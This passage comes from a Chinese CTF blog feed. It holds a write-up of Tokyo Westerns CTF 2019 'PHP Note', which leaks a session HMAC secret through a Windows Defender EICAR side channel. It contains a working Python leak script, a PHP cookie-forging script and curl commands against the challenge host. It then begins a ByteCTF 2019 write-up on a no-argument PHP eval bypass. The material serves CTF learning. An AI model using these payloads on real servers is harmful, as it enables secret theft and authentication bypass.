document.querySelector(<span class="hljs-string">"form#login"</span>).addEventListener(<span class="hljs-string">'submit'</span>, (e) =&gt; {</span><br><span class="line">                <span class="hljs-keyword">const</span> nickname = document.querySelector(<span class="hljs-string">"input#nickname"</span>)</span><br><span class="line">                <span class="hljs-keyword">const</span> firstname = document.querySelector(<span class="hljs-string">"input#firstname"</span>)</span><br><span class="line">                <span class="hljs-keyword">const</span> lastname = document.querySelector(<span class="hljs-string">"input#lastname"</span>)</span><br><span class="line">                document.querySelector(<span class="hljs-string">"input#realname"</span>).value = `${firstname.value} ${lastname.value}`</span><br><span class="line">                <span class="hljs-keyword">if</span> (nickname.value.length == <span class="hljs-number">0</span> &amp;&amp; firstname.value.length &gt; <span class="hljs-number">0</span> &amp;&amp; lastname.value.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">                    nickname.value = firstname.value.toLowerCase()[<span class="hljs-number">0</span>] + lastname.value.toLowerCase()</span><br><span class="line">                }</span><br><span class="line">            })</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>乍一看确实没有任何的漏洞点，让人比较在意的只有<code>unserialize</code>函数，我们关注的是<code>getflag()</code>，条件是成为管理员，而我们可以看到有以下条件：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($data, $hmac)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> hash_equals(hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line">$note = verify($_COOKIE[<span class="hljs-string">'note'</span>], $_COOKIE[<span class="hljs-string">'hmac'</span>])</span><br><span class="line">  ? unserialize(base64_decode($_COOKIE[<span class="hljs-string">'note'</span>]))</span><br><span class="line">  : <span class="hljs-keyword">new</span> Note(<span class="hljs-keyword">false</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果没有通过<code>verify</code>函数判断，<code>Note</code>的构造函数会设置<code>$this-&gt;isadmin = False;</code>，但是<code>$_SESSION['secret']</code>又由<code>gen_secret</code>函数生成，<code>SALT</code>和<code>PEPPER</code>我们都不知道，用一般的方法拿到 secret 基本不可能。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_secret</span><span class="hljs-params">($seed)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> md5(SALT . $seed . PEPPER);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'login'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($method === <span class="hljs-string">'POST'</span>) {</span><br><span class="line">        $nickname = (string)$_POST[<span class="hljs-string">'nickname'</span>];</span><br><span class="line">        $realname = (string)$_POST[<span class="hljs-string">'realname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($realname) || strlen($realname) &lt; <span class="hljs-number">8</span>) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'invalid name'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_SESSION[<span class="hljs-string">'realname'</span>] = $realname;</span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($nickname)) {</span><br><span class="line">            $_SESSION[<span class="hljs-string">'nickname'</span>] = $nickname;</span><br><span class="line">        }</span><br><span class="line">        $_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>而<code>hash_equals</code>也没有什么绕过的办法，所以这里看起来似乎没有什么正常的办法。</p><p>大致我们可以知道要获取 Flag ，就要成为 admin ，要成为 admin 就要知道 <code>$_SESSION['secret']</code>。</p><p>题目的大致功能也比较简单，只有登录注销、增加 post 功能，但是我们可以从相应头发现一些蛛丝马迹：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server: Microsoft-IIS/<span class="hljs-number">10.0</span></span><br><span class="line">X-Powered-By: PHP/<span class="hljs-number">7.3</span><span class="hljs-number">.9</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>之后我们就可以从这里大概猜到其实与上题一致，为什么这么说呢？</p><ul><li><code>$_SESSION['secret']</code>存放在 Session 文件当中</li><li>Session 文件又存放在本地文件系统中</li><li>如果 Session 文件含有恶意内容就会被 Windows Defender 阻止访问造成登录失败</li><li>这样我们似乎可以通过是否登录成功来获得<code>$_SESSION['secret']</code></li></ul><p>我们可以本地进行测试一下，随便登录一个发现 session 文件内容是</p><p></p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="hljs-type">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">"zedd zedd"</span>;nickname|<span class="hljs-type">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"yoyoyo"</span>;secret|<span class="hljs-type">s</span>:<span class="hljs-number">32</span>:<span class="hljs-string">"621e1d6607af0b500603e68b23e042e2"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现 secret 竟然是在我们可控数据的后面，如果没有<code>&lt;/body&gt;</code>标签闭合，Windows Defender 的 JS Engine 不像现代浏览器一样可以闭合标签，这样我们也达不到我们侧信道攻击的效果，所以我们需要找到一个办法让我们可控的地方在 secret 数据后面才行。</p><p>让我们再回顾一下登录逻辑</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'login'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($method === <span class="hljs-string">'POST'</span>) {</span><br><span class="line">        $nickname = (string)$_POST[<span class="hljs-string">'nickname'</span>];</span><br><span class="line">        $realname = (string)$_POST[<span class="hljs-string">'realname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($realname) || strlen($realname) &lt; <span class="hljs-number">8</span>) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'invalid name'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_SESSION[<span class="hljs-string">'realname'</span>] = $realname;</span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($nickname)) {</span><br><span class="line">            $_SESSION[<span class="hljs-string">'nickname'</span>] = $nickname;</span><br><span class="line">        }</span><br><span class="line">        $_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中我们可以看到这里有一个<code>$nickname</code>为空的判断，我们看看当<code>$nickname</code>为空的时候登录，session 文件会是怎么样的：</p><p></p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="hljs-type">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">"zedd zedd"</span>;secret|<span class="hljs-type">s</span>:<span class="hljs-number">32</span>:<span class="hljs-string">"8b9a527ff677cb223afa87dad7c9e6f8"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>此时如果我们不注销，直接再次发一个含有 nickname 的登录包，看看又会有什么效果</p><p></p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|<span class="hljs-type">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">"zedd zedd"</span>;secret|<span class="hljs-type">s</span>:<span class="hljs-number">32</span>:<span class="hljs-string">"621e1d6607af0b500603e68b23e042e2"</span>;nickname|<span class="hljs-type">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"yoyoyo"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>！！！这种数据格式不正是我们所需要的侧信道攻击格式吗！这样我们就可以通过 Windows Defender 侧信道攻击把 secret 读出来了！</p><p>只要我们构造类似如下的 payload 就可以了( x 为序列化之后的字符串长度)：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">realname|s:x:"<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML;<span class="hljs-keyword">var</span> mal = <span class="hljs-string">'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H;'</span> + body[<span class="hljs-number">0</span>];<span class="hljs-built_in">eval</span>(mal);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>";secret|s:32:"621e1d6607af0b500603e68b23e042e2";nickname|s:x:"<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>";</span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来就是与上面类似的步骤，利用“盲注”的形式来读 secret ，下面就贴一下 r3kapig 师傅们的脚本：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://phpnote.chal.ctf.westerns.tokyo"</span> <span class="hljs-comment"># changeme</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger</span><span class="hljs-params">(c, idx)</span>:</span></span><br><span class="line">   <span class="hljs-keyword">import</span> string</span><br><span class="line">   p = <span class="hljs-string">'''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">   p = string.Template(p).substitute({<span class="hljs-string">'idx'</span>: idx, <span class="hljs-string">'c'</span>: c})</span><br><span class="line">   <span class="hljs-keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(idx)</span>:</span></span><br><span class="line">   l, h = <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span></span><br><span class="line">   <span class="hljs-keyword">while</span> h - l &gt; <span class="hljs-number">1</span>:</span><br><span class="line">       m = (h + l) // <span class="hljs-number">2</span></span><br><span class="line">       gid = trigger(m, idx)</span><br><span class="line">       <span class="hljs-comment"># r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'})</span></span><br><span class="line">       <span class="hljs-comment"># print r.content</span></span><br><span class="line">       <span class="hljs-comment"># exit()</span></span><br><span class="line">       s = requests.session()</span><br><span class="line">       s.post(URL + <span class="hljs-string">'/?action=login'</span>, data={<span class="hljs-string">'realname'</span>: gid, <span class="hljs-string">'nickname'</span>: <span class="hljs-string">''</span>})</span><br><span class="line">       <span class="hljs-keyword">if</span> <span class="hljs-string">"/?action=login"</span> <span class="hljs-keyword">in</span> s.post(URL + <span class="hljs-string">'/?action=login'</span>, data={<span class="hljs-string">'realname'</span>: gid, <span class="hljs-string">'nickname'</span>: <span class="hljs-string">'&lt;/body&gt;'</span>}).content:</span><br><span class="line">           l = m</span><br><span class="line">       <span class="hljs-keyword">else</span>:</span><br><span class="line">           h = m</span><br><span class="line">   <span class="hljs-keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">data = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):</span><br><span class="line">   data += leak(i)</span><br><span class="line">   print(data)</span><br></pre></td></tr></tbody></table></figure><p></p><p>拿到 secret 之后，就可以构造 Note 类了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Note</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($admin)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;notes = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;isadmin = $admin;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addnote</span><span class="hljs-params">($title, $body)</span> </span>{</span><br><span class="line">        array_push(<span class="hljs-keyword">$this</span>-&gt;notes, [$title, $body]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getnotes</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;notes;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isadmin === <span class="hljs-keyword">true</span>) {</span><br><span class="line">            <span class="hljs-keyword">echo</span> FLAG;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($data, $hmac)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> hash_equals(hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hmac</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($data) || <span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_secret</span><span class="hljs-params">($seed)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// create session</span></span><br><span class="line">$_SESSION = <span class="hljs-keyword">Array</span>();</span><br><span class="line">$_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret(<span class="hljs-string">''</span>);</span><br><span class="line">$_SESSION[<span class="hljs-string">'realname'</span>] = <span class="hljs-string">"stypr stypr"</span>;</span><br><span class="line">$_SESSION[<span class="hljs-string">'nickname'</span>] = <span class="hljs-string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// generate note</span></span><br><span class="line">$note = <span class="hljs-keyword">new</span> Note(<span class="hljs-keyword">true</span>);</span><br><span class="line">$note-&gt;addnote(<span class="hljs-string">"work"</span>, <span class="hljs-string">"work"</span>);</span><br><span class="line">$data = base64_encode(serialize($note));</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/* verify</span></span><br><span class="line"><span class="hljs-comment">//echo "Data: ".(string)$data."\n";</span></span><br><span class="line"><span class="hljs-comment">//echo "HMAC: ".(string)hmac($data)."\n";</span></span><br><span class="line"><span class="hljs-comment">//echo "-----";</span></span><br><span class="line"><span class="hljs-comment">//var_dump(verify((string)$data, (string)hmac($data)));</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">curl -s <span class="hljs-string">'http://phpnote.chal.ctf.westerns.tokyo/?action=logout'</span> -H <span class="hljs-string">'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;'</span> --insecure</span><br><span class="line">curl -s <span class="hljs-string">'http://phpnote.chal.ctf.westerns.tokyo/?action=login'</span> -H <span class="hljs-string">'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;'</span> --data <span class="hljs-string">'nickname=&lt;/body&gt;&amp;realname=stypr+stypr'</span> --compressed --insecure</span><br><span class="line">curl -s <span class="hljs-string">"http://phpnote.chal.ctf.westerns.tokyo/?action=getflag"</span> -H <span class="hljs-string">"Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=&lt;?php echo $data; ?&gt;; hmac=&lt;?php echo hmac($data); ?&gt;;"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php flag.php | sh | grep <span class="hljs-string">"TWCTF"</span></span><br><span class="line">TWCTF{h0pefully_I_haven<span class="hljs-string">'t_made_a_m1stake_again}&lt;!doctype html&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="One-More"><a href="#One-More" class="headerlink" title="One More"></a>One More</h2><p>其实个人觉得 Windows Defender 这个 JS Engine 还是有很多没发掘的地方，奈何自己逆向水平不够，这里放几个会议的分享吧</p><p><a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#windows-offender-reverse-engineering-windows-defenders-antivirus-emulator-9981" target="_blank" rel="noopener">Windows Offender: Reverse Engineering Windows Defender’s Antivirus Emulator</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xz.aliyun.com/t/6216" target="_blank" rel="noopener">Playing with Windwos Defender</a></p><p><a href="https://r3kapig.com/writeup/20190904-tokyowesterns/#php-note" target="_blank" rel="noopener">r3kapig - PHP Note</a></p><p><a href="https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#php-note" target="_blank" rel="noopener">balsn - PHP Note</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;在今年的 WCTF 2019 上，Tokyo Westerns 出了一道与 Windows Defender 侧信道攻击相关的题目，在 Tokyo Westerns CTF 2019 上也有一道与之有关的题目 PHP Note，看了感觉比较有趣，但是我看的网络文章写的都比较粗略，这里我就记录一下自己的分析。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
      <category term="侧信道" scheme="https://blog.zeddyu.info/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF 2019 Web WP</title>
    <link href="https://blog.zeddyu.info/2019/09/17/bytectf2019/"/>
    <id>https://blog.zeddyu.info/2019/09/17/bytectf2019/</id>
    <published>2019-09-17T10:11:20.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>周末自己打了一会 Byte CTF ，队里其他师傅都没啥时间，自己做题比较慢，就只做了几个题。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="boring-code"><a href="#boring-code" class="headerlink" title="boring_code"></a>boring_code</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/data:\/\//i'</span>, $url)) {</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'url'</span>])){</span><br><span class="line">    $url = $_POST[<span class="hljs-string">'url'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_valid_url($url)) {</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/baidu\.com$/'</span>, $r[<span class="hljs-string">'host'</span>])) {</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $code)) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) {</span><br><span class="line">                    <span class="hljs-keyword">echo</span> <span class="hljs-string">'bye~'</span>;</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">eval</span>($code);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: host not allowed"</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"error: invalid url"</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>审计题，由 <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a> 这篇文章我们可以知道有几种 bypass trick，与题目比较类似的是最后一种 trick ，使用 data 协议绕过进行 xss</p><p></p><figure class="highlight dts hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">data:</span><span class="hljs-comment">//google.com/plain;base64,SSBsb3ZlIFBIUAo=</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我们这里 data 直接被 ban 掉了，就没办法了…</p><p>这里我们队 @rmb122 师傅是直接买了一个域名<code>xxxxbaidu.com</code>这样，然后起个 http 服务就行，然而看了 ROIS 的 wp ，还有一个比较有意思的解法，就是利用百度爬虫。</p><p>在百度搜索界面如果爬到的自己网站的话，点击自己的网站，并不是直接访问自己的网站，而是百度有一个重定向的机制，将你的网站转换成了类似如下的形式</p><p></p><figure class="highlight dts hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.baidu.com/link?url=7W9evem35YiIRoQTUDMHxL5ZzKqb8nlwG_me93YTuIZLKV6l0YLOZcxWlVTdNGPQ70SncapWoM5ceZ55fUae6a</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>最终还是会跳转到你的网站，但是这个要求就是需要让百度的虫子爬到自己的网站，百度爬虫一般是两三天生效，所以如果是早就有自己的站并且被百度爬虫爬了的，或者在百度站长上提交了的都可以采用这种类似的方法进行绕过。</p><p>接下来一个正则<code>/[a-z]+\((?R)?\)/</code>，就是一个无参数 RCE 了，意思就是只允许使用类似<code>a(b(c()));</code>这种形式，并且过滤了下划线，很多函数都不能用了。</p><p>再接下来一个正则<code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i</code>，就是一个简单的关键字过滤了，我们可以使用<code>get_definded_functions</code>来取得所有内置可用函数，再用这个正则过滤，保留最后剩下的函数，用这个函数绕过上面的正则就行了。</p><p>根据题目提示，题目的 Web 目录形式大致是</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 